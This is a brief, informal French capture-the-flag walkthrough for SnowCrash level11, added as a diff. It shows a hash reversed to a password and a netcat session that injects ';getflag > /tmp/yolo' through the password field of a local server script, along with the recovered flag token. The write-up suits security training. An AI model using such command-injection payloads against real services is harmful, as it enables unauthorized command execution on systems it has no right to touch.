@@ -1,0 +1,18 @@
+Voilà, pfichepo bac +9 Lua est dans la place donc faites pas les malin
+
+Bon on a un script serveur qui check si on lui envoit un MDP et le hash doit être de f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
+
+On le reverse et le mdp est : NotSoEasy
+
+Le getflag marche po, donc on va directement exploit le "echo pass" avec netcat
+
+
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: ;getflag > /tmp/yolo
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/yolo
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level11@SnowCrash:~$
+
+
+ou aurait aussi pu utiliser && a la place de ;
